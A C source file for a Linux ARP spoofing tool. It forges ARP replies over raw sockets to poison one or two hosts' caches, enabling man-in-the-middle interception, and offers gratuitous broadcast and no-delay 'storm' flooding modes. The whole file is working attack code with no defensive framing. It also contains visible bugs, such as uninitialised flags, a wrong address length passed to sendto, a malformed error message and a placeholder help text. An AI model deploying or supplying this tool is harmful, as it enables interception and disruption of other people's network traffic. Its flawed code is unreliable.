#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <getopt.h>

#define ARP_REPLY_TIMEOUT 5000UL
#define DELAY_MIN 100
#define DELAY_MAX 500 

const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const char * help_msg = "help message\n-g - gratuitous\n -t - target, etc";
const char * optstring = "hdgsa:b:t:i:m:M:";
const struct option long_opts[] = {
	{"help", no_argument, 0, 'h'},
	{"target-a", required_argument, 0, 'a'},
	{"target-b", required_argument, 0, 'b'},
	{"dual-target", no_argument, 0, 'd'},
	{"target", required_argument, 0, 't'},
	{"gratuitous", no_argument, 0, 'g'},
	{"interface", required_argument, 0, 'i'},
	{"rand-min", required_argument, 0, 'm'},
	{"rand-max", required_argument, 0, 'M'},
	{"storm", no_argument, 0, 's'},
	{0, 0, 0, 0}
};

uint64_t get_time_ms() {
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

bool get_mac(int fd, const char * interface, const char * src_ip, const char * dst_ip, uint8_t * dst_mac, const uint8_t * src_mac) {
	struct sockaddr_ll sll = {0};
	struct ether_arp arpf = {0};
	struct ether_arp arpf_recv = {0};
	
	uint64_t end_time = get_time_ms() + ARP_REPLY_TIMEOUT;

	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ARP);
	sll.sll_ifindex = if_nametoindex(interface);
	sll.sll_halen = ETH_ALEN;
	
	memcpy(sll.sll_addr, broadcast_mac, 6);

	memcpy(arpf.arp_sha, src_mac, 6);
	if(src_ip)
		inet_pton(AF_INET, src_ip, arpf.arp_spa);			
	inet_pton(AF_INET, dst_ip, arpf.arp_tpa);
	arpf.arp_hrd = htons(ARPHRD_ETHER);
	arpf.arp_pro = htons(ETH_P_IP);
	arpf.arp_hln = 6;
	arpf.arp_pln = 4;
	arpf.arp_op = htons(ARPOP_REQUEST);

	if(sendto(fd, &arpf, sizeof(arpf), 0,(const struct sockaddr *)&sll, sizeof(arpf)) <= 0){
		fprintf(stderr, "Error: unable to call sendto: %s\n", strerror(errno));
		return 1;
	}

	while(get_time_ms() < end_time) {
		ssize_t n = recvfrom(fd, &arpf_recv, sizeof(arpf_recv), 0, 0, 0);
		if (n < 0) {
			fprintf(stderr, "Error: Falled to recivie frame:\n", strerror(errno));
			return 1;
		}

		if(htons(arpf_recv.arp_op) == ARPOP_REPLY) {
			if(!memcmp(arpf_recv.arp_tha, src_mac, 6) && !memcmp(arpf_recv.arp_spa, arpf.arp_tpa, 4)){
				memcpy(dst_mac, arpf_recv.arp_sha, 6);
				return 0;
			}
		}
	}	       
	return 1;
}	

bool arp_reply(int fd, const char * interface, const char * src_ip, const char * target_ip, const uint8_t * src_mac, const uint8_t * dst_mac) { 
	struct sockaddr_ll sll;
	struct ether_arp arpf;
	
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ARP);
	sll.sll_ifindex = if_nametoindex(interface);
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, 6);	

	memcpy(arpf.arp_sha, src_mac, 6);
	memcpy(arpf.arp_tha, dst_mac, 6);
	inet_pton(AF_INET, src_ip, arpf.arp_spa);			
	inet_pton(AF_INET, target_ip, arpf.arp_tpa);
	arpf.arp_hrd = htons(ARPHRD_ETHER);
	arpf.arp_pro = htons(ETH_P_IP);
	arpf.arp_hln = 6;
	arpf.arp_pln = 4;
	arpf.arp_op = htons(ARPOP_REPLY);

	if(sendto(fd, &arpf, sizeof(arpf), 0,(const struct sockaddr *)&sll, sizeof(arpf)) <= 0){
		fprintf(stderr, "Error: unable to call sendto: %s\n", strerror(errno));
		return 1;
	}
	else {
		return 0;
	}
}


int main(int argc, char * argv[]) {	
	bool is_dual_target;
	bool is_gratuitous;
	bool is_arp_storm;	
	uint8_t src_mac[6];
	uint8_t dst_mac[6];
	uint8_t dst_mac_b[6];

	char * target_a;
	char * target_b;
	char * interface;

	int opt;
	int fd;	
	int rand_min = DELAY_MIN;
	int rand_max = DELAY_MAX;

	struct in_addr tmp;
	struct ifreq ifrq;

	char if_path[256];

	for (;;) {
		opt = getopt_long(argc, argv, optstring, long_opts, &opt);
		
		if(opt == -1)
			break;
		
		switch(opt) {
			case 'h':
				fprintf(stderr, "%s", help_msg);
				return 0;
			case 'a':
				target_a = optarg;
				if(inet_pton(AF_INET, optarg, &tmp) != 1) {			
					fprintf(stderr, "Target A IP address is invalid\n");
					return 1;
				}
				break;
			case 'b':
				target_b = optarg;
				if(inet_pton(AF_INET, optarg, &tmp) != 1) {
					fprintf(stderr, "Target B IP address is invalid\n");
					return 1;
				}			
				break;
			case 'd':
				is_dual_target = 1;
				break;
			case 't':			
				target_a = optarg;
				if(inet_pton(AF_INET, optarg, &tmp) != 1) {
					fprintf(stderr, "Target IP is invalid\n");
					return 1;
				}
				break; 
			case 'g':
				is_gratuitous = 1;
				break;
			case 'i':
				interface = optarg;
				break;
			case 'm':
				rand_min = atoi(optarg);
				break;
			case 'M':
				rand_max = atoi(optarg);
				break;
			case 's':
				is_arp_storm = 1;
				break;
			default:
				break;
		}
	}

	if(rand_min < 1) {
		fprintf(stderr, "Invalid rand_min value\n");
		return 1;
	}
	if(rand_max < 1) {
		fprintf(stderr,"Invalid rand_max value\n");
		return 1;
	}

	if((target_a == 0 || target_b == 0) && is_dual_target) {
		fprintf(stderr, "One target IP missing\n");
		return 1;
	}

	if(interface == 0) {
		fprintf(stderr, "Interface not specified\n");
		return 1;
	}

	fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	
	if(fd < 0) {
		fprintf(stderr, "Error: Unable to create socket: %s\n", strerror(errno));
		return 1;
	}
	
	snprintf(if_path, sizeof(if_path), "/sys/class/net/%s", interface);

	if(access(if_path, F_OK) == -1) {
		printf("Interface %s does not exist:%s\n", interface, strerror(errno));
		close(fd);
		return 1;
	}

	ifrq.ifr_addr.sa_family = AF_INET;
	strncpy(ifrq.ifr_name, interface, IFNAMSIZ - 1);
	
	if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0) {
		fprintf(stderr, "Error: unable to call ioctl: %s\n", strerror(errno));
		close(fd);
		return 1;
	}
	memcpy(src_mac, ifrq.ifr_addr.sa_data, 6);
	
	if(is_dual_target) {
		if(get_mac(fd, interface, target_b, target_a, dst_mac, src_mac) || get_mac(fd, interface, target_a, target_b, dst_mac_b, src_mac)) {
			fprintf(stderr, "Unable to resolve targets\n");
			close(fd);
			return 1;
		}
	}
	else {
		if(get_mac(fd, interface, NULL, target_a, dst_mac, src_mac)) {
			fprintf(stderr, "Unable to resolve target\n");
			close(fd);
			return 1;
		}
	}

	srandom(time(NULL));

	for(;;) {
		uint16_t delay_ms = rand_min + random() % (rand_max - rand_min);
		bool reply_a, reply_b;
		
		if(is_dual_target) {
			if(!is_gratuitous) {
				reply_a = arp_reply(fd, interface, target_a, target_b, src_mac, dst_mac_b);
				reply_b = arp_reply(fd, interface, target_b, target_a, src_mac, dst_mac);
			}
			else {
				reply_a = arp_reply(fd, interface, target_a, target_a, src_mac, broadcast_mac);
				reply_b = arp_reply(fd, interface, target_b, target_b, src_mac, broadcast_mac);
			}
		}
		else {
			if(!is_gratuitous) {
				reply_a = arp_reply(fd, interface, target_a, target_a, src_mac, dst_mac);
			}		
			else {
				reply_a = arp_reply(fd, interface, target_a, target_a, src_mac, broadcast_mac);
			}
		}

		if(reply_a || reply_b) {
			fprintf(stderr, "ARP send falled, exiting without cleanup!\n");
			close(fd);
			return 1;
		}	

		if(!is_arp_storm)
			usleep(delay_ms * 1000);
	}

	close(fd);
	return 0;
}	
